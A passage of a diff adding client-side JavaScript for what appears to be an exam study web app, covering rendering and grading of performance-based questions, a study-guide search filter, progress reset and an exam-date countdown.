+  $("#pbqList").hidden=false; $("#pbqArea").innerHTML="";
+}
+function openPBQ(i){
+  const p = PBQ[i];
+  $("#pbqList").hidden = true;
+  let html = `<button class="btn ghost" id="pbqBack">← All PBQs</button><h2>${p.title}</h2><div class="scen">${p.scenario}</div>`;
+  p.parts.forEach((pt,pi)=>{
+    if(pt.title) html += `<h3>${pt.title}</h3>`;
+    if(pt.type==="select"){
+      const nLabelCols = pt.cols.length - pt.rows[0].sel.length;
+      html += `<div class="tblwrap"><table class="pbqt"><tr>${pt.cols.map(c=>`<th>${c}</th>`).join("")}</tr>${pt.rows.map((r,ri)=>{
+        const labels = nLabelCols>1 ? r.label.split("|") : [r.label];
+        return `<tr>${labels.map(l=>`<td>${l}</td>`).join("")}${r.sel.map((s,si)=>`<td><select data-p="${pi}" data-r="${ri}" data-s="${si}"><option value="">— choose —</option>${pt.pools[s[1]].map(o=>`<option>${esc(o)}</option>`).join("")}</select></td>`).join("")}</tr>`;}).join("")}</table></div>`;
+    } else if(pt.type==="order"){
+      html += `<p class="muted">Use ▲ ▼ to arrange top (first) to bottom (last).</p><ol class="order" data-p="${pi}">${shuffle(pt.items).map(t=>`<li data-v="${esc(t)}"><span>${esc(t)}</span><span class="mv"><button data-d="-1" aria-label="Move up">▲</button><button data-d="1" aria-label="Move down">▼</button></span></li>`).join("")}</ol>`;
+    } else if(pt.type==="number"){
+      html += `<div class="nums">${pt.rows.map((r,ri)=>`<label>${r.label}<input type="text" inputmode="decimal" data-p="${pi}" data-r="${ri}" placeholder="0"></label>`).join("")}</div>`;
+    }
+  });
+  html += `<div class="qnav"><button class="btn ghost" id="pbqReset">Reset</button><button class="btn" id="pbqCheck">Check answers</button></div><div id="pbqResult"></div>`;
+  $("#pbqArea").innerHTML = html;
+  $("#pbqBack").onclick = renderPBQList;
+  $("#pbqReset").onclick = () => openPBQ(i);
+  $("#pbqArea").querySelectorAll(".order").forEach(ol => ol.onclick = e => {
+    const b = e.target.closest("button"); if(!b) return;
+    const li = b.closest("li"), d = +b.dataset.d;
+    if(d<0 && li.previousElementSibling) ol.insertBefore(li, li.previousElementSibling);
+    if(d>0 && li.nextElementSibling) ol.insertBefore(li.nextElementSibling, li);
+    ol.querySelectorAll("li").forEach(x=>x.classList.remove("right","wrong"));
+  });
+  $("#pbqCheck").onclick = () => gradePBQ(i);
+  window.scrollTo(0,0);
+}
+function gradePBQ(i){
+  const p = PBQ[i]; let got=0, tot=0;
+  p.parts.forEach((pt,pi)=>{
+    if(pt.type==="select"){
+      $("#pbqArea").querySelectorAll(`select[data-p="${pi}"]`).forEach(s=>{ const ans = pt.rows[s.dataset.r].sel[s.dataset.s][0]; tot++; const ok = s.value===ans; if(ok) got++; s.classList.toggle("right",ok); s.classList.toggle("wrong",!ok); s.title = ok?"":"Answer: "+ans; s.parentElement.querySelector(".ans")?.remove(); if(!ok) s.insertAdjacentHTML("afterend",`<div class="ans">✓ ${esc(ans)}</div>`); });
+    } else if(pt.type==="order"){
+      $("#pbqArea").querySelectorAll(`.order[data-p="${pi}"] li`).forEach((li,k)=>{ tot++; const ok = li.dataset.v===pt.items[k]; if(ok) got++; li.classList.toggle("right",ok); li.classList.toggle("wrong",!ok); });
+    } else if(pt.type==="number"){
+      $("#pbqArea").querySelectorAll(`input[data-p="${pi}"]`).forEach(inp=>{ const ans = pt.rows[inp.dataset.r].answer; tot++; const v = parseFloat(inp.value.replace(/[$,\s]/g,"")); const ok = !isNaN(v) && Math.abs(v-ans) < 0.001*Math.max(1,Math.abs(ans)); if(ok) got++; inp.classList.toggle("right",ok); inp.classList.toggle("wrong",!ok); inp.parentElement.querySelector(".ans")?.remove(); if(!ok) inp.insertAdjacentHTML("afterend",`<div class="ans">✓ ${ans.toLocaleString()}</div>`); });
+    }
+  });
+  const pct = Math.round(got/tot*100);
+  const best = store.get("pbq",{}); best[p.id] = Math.max(best[p.id]||0, pct); store.set("pbq",best);
+  let correctOrder = p.parts.filter(pt=>pt.type==="order").map(pt=>`<p><b>${pt.title||"Correct order"}:</b> ${pt.items.map(esc).join(" → ")}</p>`).join("");
+  $("#pbqResult").innerHTML = `<div class="exp ${pct>=80?"ok":"no"}"><b>${got} / ${tot} correct (${pct}%)</b>${pct===100?" — perfect.":""}${pct<100?correctOrder:""}<p>${p.explain}</p></div>`;
+  $("#pbqResult").scrollIntoView({behavior:"smooth", block:"nearest"});
+}
+
+/* ---------- guide search ---------- */
+function setupGuideFilter(){
+  $("#gsearch").oninput = e => {
+    const q = e.target.value.trim().toLowerCase();
+    document.querySelectorAll("#guideBody section, #guideBody h3").forEach(el=>el.classList.remove("hit"));
+    if(q.length<3){ document.querySelectorAll("#guideBody mark").forEach(m=>m.replaceWith(m.textContent)); $("#gcount").textContent=""; return; }
+    let first=null, n=0;
+    document.querySelectorAll("#guideBody li, #guideBody td, #guideBody p").forEach(el=>{ const hit = el.textContent.toLowerCase().includes(q); el.classList.toggle("hl", hit); if(hit){ n++; if(!first) first=el; } });
+    $("#gcount").textContent = n ? n+" matches" : "No matches";
+    if(first) first.scrollIntoView({block:"center"});
+  };
+}
+
+/* ---------- init ---------- */
+document.addEventListener("DOMContentLoaded", () => {
+  renderPlan(); renderHistory(); renderPBQList(); setupGuideFilter();
+  const counts = {}; QB.forEach(q=>counts[q[0]]=(counts[q[0]]||0)+1);
+  $("#domBtns").innerHTML = Object.keys(DOMAINS).map(d=>`<button class="btn ghost" data-m="${d}">Domain ${d}: ${DOMAINS[d]} <small>(${counts[d]})</small></button>`).join("");
+  $("#totalQ").textContent = QB.length;
+  $("#quizSetup").onclick = e => { const b = e.target.closest("[data-m]"); if(b) startQuiz(b.dataset.m); };
+  $("#resetAll").onclick = () => { if($("#resetAll").dataset.c){ ["plan","missed","history","pbq"].forEach(k=>store.set(k, k==="missed"||k==="history"?[]:{})); renderPlan(); renderHistory(); renderPBQList(); $("#resetAll").textContent="Progress cleared"; delete $("#resetAll").dataset.c; } else { $("#resetAll").dataset.c="1"; $("#resetAll").textContent="Click again to confirm"; } };
+  const now = new Date(); const days = Math.round((new Date(2026,10,15) - new Date(now.getFullYear(),now.getMonth(),now.getDate()))/86400000);
+  $("#countdown").textContent = days>1 ? days+" days to exam" : days===1 ? "Exam tomorrow" : days===0 ? "Exam day" : "";
+  show(location.hash.slice(1));
+});
+
+</script>
+</body>
+</html>
